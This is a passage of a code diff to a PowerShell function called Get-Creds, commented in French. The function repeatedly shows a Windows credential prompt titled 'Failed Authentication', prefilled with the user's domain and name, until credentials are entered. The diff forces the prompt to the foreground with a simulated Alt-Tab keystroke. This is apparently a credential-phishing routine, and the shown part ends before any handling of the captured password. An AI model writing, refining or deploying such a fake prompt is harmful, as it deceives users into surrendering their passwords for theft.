@@ -1,28 +1,17 @@
 function Get-Creds {
-    Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class Window {
-        [DllImport("user32.dll")]
-        public static extern bool SetForegroundWindow(IntPtr hWnd);
-        [DllImport("user32.dll")]
-        public static extern IntPtr GetForegroundWindow();
-    }
-"@
-
     $form = $null
 
     while ($form -eq $null) {
         Write-Host "DEBUG: Ouverture du dialogue credentials" -ForegroundColor Yellow
         
-        # Amener PowerShell au premier plan
-        $pwshWindow = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle
-        [Window]::SetForegroundWindow($pwshWindow) | Out-Null
-        Start-Sleep -Milliseconds 100
+        # Force PowerShell en avant-plan
+        $pwshId = [System.Diagnostics.Process]::GetCurrentProcess().Id
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.SendKeys]::SendWait("%{TAB}")
+        Start-Sleep -Milliseconds 200
         
         $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName + '\' + [Environment]::UserName, [Environment]::UserDomainName)
         
-        # L'utilisateur a cliqué "Annuler"
         if ($cred -eq $null) {
             Write-Host "Annulé par l'utilisateur" -ForegroundColor Red
             return $null
